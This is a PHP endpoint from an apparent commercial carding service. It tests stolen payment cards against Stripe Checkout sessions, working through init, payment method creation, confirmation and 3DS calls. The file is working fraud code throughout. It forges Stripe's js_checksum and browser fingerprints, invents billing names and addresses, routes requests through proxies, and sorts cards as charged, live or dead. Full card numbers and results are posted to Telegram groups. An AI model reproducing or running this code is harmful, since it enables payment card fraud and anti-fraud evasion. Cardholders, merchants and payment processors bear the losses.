<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php';
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;
if (empty($_SESSION['uid'])) {http_response_code(401);echo json_encode(['Response' => 'Session expired']);exit;}
$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {echo json_encode(['Response' => 'User not found']);exit;}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {echo json_encode(['Response' => 'You are banned from using Cyborx.']);exit;}
// if ($userStatus === 'FREE') {echo json_encode(['Response' => 'This API is only usable for Premium or Admin Users. Please upgrade your Plan.']);exit;}
if ($currentCredits < 2) {echo json_encode(['Response' => 'Insufficient Credits']);exit;}
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);exit;}
} else {$proxyHost = '';$proxyPort = 0;$proxyUsername = '';$proxyPassword = '';}
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
$cc1 = $_GET['cc'] ?? '';
$cs_live = $_GET['cs_live'] ?? '';
$pk_live = $_GET['pk_live'] ?? '';
$emailIn = $_GET['email'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');
if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {echo json_encode(['Response' => 'Invalid Card Format']);exit;}
if (empty($cs_live) || empty($pk_live)) {echo json_encode(['Response' => 'Missing cs_live or pk_live']);exit;}
$yearLength = strlen($year);
if ($yearLength <= 2) {$year = "20" . $year;}
$month = sprintf('%02d', (int)$month);
function generateUserAgent() {
    $browsers = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"];
    return $browsers[array_rand($browsers)];
}
function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/{$binNumber}";
    $headers = ['Accept: application/json','User-Agent: ' . generateUserAgent(),];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {return ['brand' => 'UNKNOWN','card_type' => 'UNKNOWN','level' => 'STANDARD','issuer' => 'Unknown','country_info' => 'Unknown'];}
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {return ['brand' => 'UNKNOWN','card_type' => 'UNKNOWN','level' => 'STANDARD','issuer' => 'Unknown','country_info' => 'Unknown'];}
    $binData = json_decode($response, true) ?: [];
    return ['brand' => $binData['brand'] ?? 'UNKNOWN','card_type' => $binData['type'] ?? 'UNKNOWN','level' => $binData['level'] ?? 'STANDARD','issuer' => $binData['bank'] ?? 'Unknown','country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')];
}
function updateCredits($pdo, $uid, $deduct, $currentCredits, $isLive = false, $isCharged = false) {
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = ['chat_id' => $chatId,'text' => $messageHtml,'parse_mode' => 'HTML','disable_web_page_preview' => true,];
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_POST => true,CURLOPT_POSTFIELDS => http_build_query($postData),CURLOPT_RETURNTRANSFER => true,CURLOPT_TIMEOUT => 10,]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {echo json_encode(['Response' => 'Bot token missing in config']);exit;}
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
curl_close($chBin);
function random_hex($length) {
    $chars = 'abcdef0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {$result .= $chars[rand(0, strlen($chars) - 1)];}
    return $result;
}
function random_guid() {return random_hex(32);}
function random_stripe_user_agent_tag() {
    $tag = random_hex(10);
    return "stripe.js/{$tag}; stripe-js-v3/{$tag}; checkout";
}
function xor_encode($plaintext) {
    $key = [5];
    $key_length = count($key);
    $plaintext_length = strlen($plaintext);
    $ciphertext = '';
    for ($i = 0; $i < $plaintext_length; $i++) {$ciphertext .= chr(ord($plaintext[$i]) ^ $key[$i % $key_length]);}
    return $ciphertext;
}
function encode_base64_custom($text) {
    $encoded_bytes = base64_encode($text);
    $encoded_text = str_replace(array("/", "+"), array("%2F", "%2B"), $encoded_bytes);
    return $encoded_text;
}
function get_js_encoded_string($pm) {
    $pm_encoded = xor_encode($pm);
    $base64_encoded = encode_base64_custom($pm_encoded);
    return $base64_encoded . "eCUl";
}
function stripeCheckoutHitRaw(
    string $cc,
    string $mm,
    string $yy,
    string $cvv,
    string $pkLive,
    string $csLive,
    string $emailIn,
    bool $proxyRequired,
    string $proxyHost,
    int $proxyPort,
    string $proxyUsername,
    string $proxyPassword
) : array {
    $firstNames = ['John', 'Jane', 'Alex', 'Chris', 'Sam', 'Taylor', 'Jordan', 'Logan'];
    $lastNames = ['Smith', 'Doe', 'Brown', 'Miller', 'Wilson', 'Davis', 'Moore', 'Taylor'];
    $fname = $firstNames[array_rand($firstNames)];
    $lname = $lastNames[array_rand($lastNames)];
    $randNum = mt_rand(1000, 9999);
    if (!empty($emailIn)) {$email = $emailIn;} else {$email = strtolower($fname . '.' . $lname . $randNum . '@gmail.com');}
    $addresses = [
        [
            'street' => '3501 S Main St',
            'city'   => 'Gainesville',
            'state'  => 'FL',
            'zip'    => '32601'
        ],
        [
            'street' => '3501 Main St',
            'city'   => 'Frederica',
            'state'  => 'DE',
            'zip'    => '19946'
        ],
        [
            'street' => '311 Otter Way',
            'city'   => 'Frederica',
            'state'  => 'DE',
            'zip'    => '19946'
        ],
        [
            'street' => '1 Saint Agnes St',
            'city'   => 'Frederica',
            'state'  => 'DE',
            'zip'    => '19946'
        ],
        [
            'street' => '205 Kestrel Ct #205',
            'city'   => 'Frederica',
            'state'  => 'DE',
            'zip'    => '19946'
        ],
        [
            'street' => '5035 93rd Ave',
            'city'   => 'Pinellas Park',
            'state'  => 'FL',
            'zip'    => '33782'
        ],
        [
            'street' => '809 Bremen Ave',
            'city'   => 'Perdido Key',
            'state'  => 'FL',
            'zip'    => '32507'
        ],
        [
            'street' => '635 Orange Ct',
            'city'   => 'Rockledge',
            'state'  => 'FL',
            'zip'    => '32955'
        ],
        [
            'street' => '4107 78th St W',
            'city'   => 'Bradenton',
            'state'  => 'FL',
            'zip'    => '34209'
        ],
        [
            'street' => '190 SW 3rd Ct',
            'city'   => 'Florida City',
            'state'  => 'FL',
            'zip'    => '33034'
        ],
        [
            'street' => '13030 Silver Bay Ct',
            'city'   => 'Fort Myers',
            'state'  => 'FL',
            'zip'    => '33913'
        ],
    ];
    
    $addr = $addresses[array_rand($addresses)];
    
    $line1 = $addr['street'];
    $city  = $addr['city'];
    $state = $addr['state'];
    $zip   = $addr['zip'];
    $ua = generateUserAgent();
    $stripe_tag = random_stripe_user_agent_tag();
    $pmSuffix = random_hex(4);
    $version = random_hex(10);
    $browserLocales = ['en-US', 'en-GB', 'fr-FR', 'de-DE'];
    $browserLocale = $browserLocales[array_rand($browserLocales)];
    $tzs = ['-300', '-360', '-420', '-480', '-240', '0', '60'];
    $browserTZ = $tzs[array_rand($tzs)];
    $browserLanguages = [''];
    $browserLanguage = $browserLanguages[array_rand($browserLanguages)];
    $browserColorDepths = ['24', '30', '32'];
    $browserColorDepth = $browserColorDepths[array_rand($browserColorDepths)];
    $browserScreenHeights = ['864', '1080', '1440'];
    $browserScreenHeight = $browserScreenHeights[array_rand($browserScreenHeights)];
    $browserScreenWidths = ['1536', '1920', '2560'];
    $browserScreenWidth = $browserScreenWidths[array_rand($browserScreenWidths)];
    $currency = 'usd';
    $coname = 'Unknown Merchant';
    $items = 'Unknown Product';
    $amount = 0;
    $amttt = 0;
    $surl = 'N/A';
    $count = 0;
    $maxRetries = 3;
    $card = $cc . '|' . $mm . '|' . $yy . '|' . $cvv;
    $proxy = $proxyRequired ? $proxyHost . ':' . $proxyPort : null;
    $proxyauth = $proxyRequired && (!empty($proxyUsername) || !empty($proxyPassword)) ? $proxyUsername . ':' . $proxyPassword : null;
retry:
    $ch = curl_init();
    if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$csLive.'/init');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pkLive.'&eid=NA&browser_locale='.$browserLocale.'&redirect_type=url');
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['accept: application/json','content-type: application/x-www-form-urlencoded','user-agent: ' . $ua,'origin: https://checkout.stripe.com','referer: https://checkout.stripe.com/',]);
    $response = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($response, true);
    if ($json === null) {
        if ($count < $maxRetries) {$count++;goto retry;}
        return ['result_status' => 'dead','response_msg' => "INIT RESPONSE: $response",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
    } else {
        if (isset($json['error'])) {
            $errorCode = $json['error']['code'];
            $errorMessage = $json['error']['message'];
            return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$errorCode » $errorMessage]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
        } else {
            $initChecksum = $json['init_checksum'];
            $coname = $json['account_settings']['display_name'];
            $currency = $json['currency'];
            if (isset($json['invoice']['lines']['data'][0]['price']['product']['name'])) {$items = $json['invoice']['lines']['data'][0]['price']['product']['name'];} elseif (isset($json['line_item_group']['line_items'][0]['name'])) {$items = $json['line_item_group']['line_items'][0]['name'];} elseif (isset($json['product']['name'])) {$items = $json['product']['name'];}
        }
    }
    if (isset($json['line_item_group']['line_items'][0]['total'])) {$amount = $json['line_item_group']['line_items'][0]['total'];} elseif (isset($json['invoice']['total'])) {$amount = $json['invoice']['total'];} elseif (isset($json['line_item_group']['total'])) {$amount = $json['line_item_group']['total'];}
    $amttt = intval($amount)/100;
    $ch = curl_init();
    if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
    $headers = ['accept: application/json','content-type: application/x-www-form-urlencoded','origin: https://checkout.stripe.com','referer: https://checkout.stripe.com/',];
    $data = ['type' => 'card','card[number]' => $cc,'card[cvc]' => $cvv,'card[exp_month]' => $mm,'card[exp_year]' => $yy,'billing_details[name]' => $fname . ' ' . $lname,'billing_details[email]' => $email,'billing_details[address][country]' => 'US','billing_details[address][line1]' => $line1,'billing_details[address][city]' => $city,'billing_details[address][postal_code]' => $zip,'billing_details[address][state]' => $state,'key' => $pkLive,'payment_user_agent' => $stripe_tag];
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if ($response === false) {
        if ($count < $maxRetries) {$count++;goto retry;}
        return ['result_status' => 'dead','response_msg' => 'cURL error: ' . curl_error($ch),'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
    }
    curl_close($ch);
    $json = json_decode($response, true);
    if ($json !== null && isset($json['id'])) {
        $newpm = $json['id'];
        $pm = '{"id":"' . $newpm . $pmSuffix . '"';
        $newpm_enc = get_js_encoded_string($pm);
    } else {
        $message = isset($json['error']['message']) ? $json['error']['message'] : '';
        if ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];} elseif (strpos($response, 'You passed')) {if ($count < $maxRetries) {$count++;goto retry;}}
    }
    $ch = curl_init();
    if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
    $data = ['eid' => 'NA','payment_method' => $newpm,'consent[terms_of_service]' => 'accepted','expected_amount' => $amount,'expected_payment_method_type' => 'card','key' => $pkLive,'version' => $version,'init_checksum' => $initChecksum,'js_checksum' => $newpm_enc];
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$csLive.'/confirm');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($response, true);
    $payatt = $json['payment_intent']['next_action']['use_stripe_sdk']['three_d_secure_2_source'] ?? null;
    $servertrans = $json['payment_intent']['next_action']['use_stripe_sdk']['server_transaction_id'] ?? null;
    $result = '{"threeDSServerTransID":"'.$servertrans.'"}';
    $enc_server = base64_encode($result);
    $secret = $json['payment_intent']['client_secret'] ?? null;
    $pi = $json['payment_intent']['id'] ?? null;
    $message = $json['error']['message'] ?? null;
    $dcode = $json['error']['decline_code'] ?? null;
    $code = $json['error']['code'] ?? null;
    $status = $json['status'] ?? null;
    $surl = $json['success_url'] ?? $surl;
    if ($status == 'succeeded') {return ['result_status' => 'charge','response_msg' => 'Payment Successful','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($response, 'You passed')) {if ($count < $maxRetries) {$count++;goto retry;}}
    elseif (strpos($response, 'insufficient_funds')) {return ['result_status' => 'live','response_msg' => 'Insufficient Funds','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($response, '"verification_url": "')) {return ['result_status' => 'dead','response_msg' => 'HCAPTCHA Not Bypassed','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (empty($response)) {if ($count < $maxRetries) {$count++;goto retry;}}
    elseif ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$dcode : $code » $message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    $headers = ['accept: application/json','content-type: application/x-www-form-urlencoded','referer: https://js.stripe.com/','user-agent: ' . $ua,'origin: https://js.stripe.com',];
    $data = ['source' => $payatt,'browser' => '{"fingerprintAttempted":true,"fingerprintData":"' . $enc_server . '","challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"'.$browserLanguage.'","browserColorDepth":"'.$browserColorDepth.'","browserScreenHeight":"'.$browserScreenHeight.'","browserScreenWidth":"'.$browserScreenWidth.'","browserTZ":"'.$browserTZ.'","browserUserAgent":"'.$ua.'"}','one_click_authn_device_support[hosted]' => 'false','one_click_authn_device_support[same_origin_frame]' => 'false','one_click_authn_device_support[spc_eligible]' => 'true','one_click_authn_device_support[webauthn_eligible]' => 'true','one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true','key' => $pkLive];
    $ch = curl_init();
    if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($response, true);
    if ($json && isset($json['state'])) {
        $state = $json['state'];
        if ($state === 'challenge_required') {return ['result_status' => 'dead','response_msg' => "[ 3DS BIN ] » [$state]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    }
    $ch = curl_init();
    if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=$pkLive&is_stripe_sdk=false&client_secret=$secret");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['authority: api.stripe.com','accept: application/json','accept-language: en-US,en;q=0.9','content-type: application/x-www-form-urlencoded','origin: https://js.stripe.com','referer: https://js.stripe.com/','sec-fetch-dest: empty','sec-fetch-mode: cors','sec-fetch-site: same-site','user-agent: ' . $ua,]);
    $result = curl_exec($ch);
    $extract = json_decode($result, true);
    curl_close($ch);
    $status = $extract['status'] ?? null;
    $errormes = $extract['error']['message'] ?? null;
    $message = $extract['last_payment_error']['message'] ?? null;
    $dcode = $extract['last_payment_error']['decline_code'] ?? null;
    $code = $extract['last_payment_error']['code'] ?? null;
    if ($status == 'succeeded') {return ['result_status' => 'charge','response_msg' => 'Payment Successful','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($result, 'insufficient_funds')) {return ['result_status' => 'live','response_msg' => $message ?: 'Insufficient Funds','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($result, 'verify_challenge')) {return ['result_status' => 'dead','response_msg' => '[ HCAPTCHA Not Bypassed]','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($result, 'authentication_challenge')) {return ['result_status' => 'dead','response_msg' => '[ OTP CC ]','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    elseif (strpos($result, 'Unrecognized')) {if ($count < $maxRetries) {$count++;goto retry;}}
    else {$msg = $message ?: $errormes ?: 'Payment Failed';return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$dcode : $code » $msg]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
    return ['result_status' => 'dead','response_msg' => 'Payment Failed','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
}
$rawResult = stripeCheckoutHitRaw($cc,$month,$year,$cvv,$pk_live,$cs_live,$emailIn,$proxyRequired,$proxyHost,$proxyPort,$proxyUsername,$proxyPassword);
$status = $rawResult['result_status'] ?? 'dead';
$msg = $rawResult['response_msg'] ?? 'Unknown Error';
$merchant = $rawResult['merchant'] ?? 'Unknown Merchant';
$price = $rawResult['price'] ?? 'USD 0';
$productName = $rawResult['productName'] ?? 'Unknown';
$receipt = $rawResult['receipt'] ?? 'N/A';
if ($status === 'charge') {
    $newCredits = updateCredits($pdo, $uid, 5, $currentCredits, false, true);
    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Charged 🔥\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage = "<b>Hit Detected ✅</b>\n━━━━━━━━\n<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ➜</b> <b>Charged 🔥</b>\n<b>Response ➜</b> {$msg} {$price} 🎉\n<b>Gateway ➜</b> Stripe Checkout Hitter\n━━━━━━━━━━━\n<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode(['status' => 'charge','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
    exit;
} elseif ($status === 'live') {
    $newCredits = updateCredits($pdo, $uid, 3, $currentCredits, true, false);
    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Live ✅\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    echo json_encode(['status' => 'live','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
    exit;
}
$newCredits = updateCredits($pdo, $uid, 0, $currentCredits);
echo json_encode(['status' => 'dead','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
exit;
?>